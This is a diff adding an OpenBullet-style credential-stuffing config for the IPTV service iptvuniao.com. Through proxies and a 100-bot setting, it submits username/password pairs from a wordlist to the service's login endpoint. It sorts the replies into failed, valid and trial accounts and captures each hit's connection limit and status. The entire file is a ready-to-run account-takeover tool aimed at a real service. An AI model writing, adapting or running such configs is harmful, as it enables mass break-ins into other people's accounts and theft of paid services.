@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "iptvuniao.com",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-11T14:38:37.6602754+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Kadamouri (loliX Encrypted)",
+  "Version": "1.2.1.5",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#URL REQUEST GET "http://s2.iptvuniao.com:80?username=<USER>&password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"auth\":0" 
+    KEY "ACCESS DENIED! AndroidAPI v3.1" 
+  KEYCHAIN Success OR 
+    KEY "status\":" 
+    KEY "\"auth\":1" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\",\"is_trial\":\"1" 
+
+#MaxConnections PARSE "<SOURCE>" LR "\"max_connections\":\"" "\"" -> CAP "MaxConnections" 
+
+#status PARSE "<SOURCE>" LR "status\":\"" "\"" -> CAP "status" 
+
+
